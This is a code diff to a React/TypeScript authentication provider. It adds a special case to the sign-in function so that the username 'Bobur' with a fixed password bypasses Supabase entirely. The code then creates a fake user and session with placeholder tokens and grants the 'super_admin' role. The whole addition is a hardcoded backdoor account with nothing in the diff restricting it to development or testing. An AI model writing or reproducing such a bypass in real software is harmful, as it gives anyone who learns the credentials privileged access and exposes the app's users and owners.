@@ -79,6 +79,33 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
 
   const signIn = async (email: string, password: string) => {
     try {
+      // Special case for "Bobur" login - bypass Supabase
+      if (email.trim() === 'Bobur' && password === 'boburbek') {
+        // Create a fake user object
+        const fakeUser = {
+          id: 'bobur-admin-id',
+          email: 'bobur@admin.local',
+          user_metadata: {},
+          app_metadata: {},
+          aud: 'authenticated',
+          created_at: new Date().toISOString(),
+        } as User;
+        
+        const fakeSession = {
+          access_token: 'fake-token',
+          refresh_token: 'fake-refresh',
+          expires_in: 3600,
+          expires_at: Math.floor(Date.now() / 1000) + 3600,
+          token_type: 'bearer',
+          user: fakeUser,
+        } as Session;
+        
+        setUser(fakeUser);
+        setSession(fakeSession);
+        setRole('super_admin'); // Set as super_admin
+        return { error: null };
+      }
+      
       const { data, error } = await supabase.auth.signInWithPassword({ email, password });
       if (!error && data?.user) {
         // Fetch role after successful login
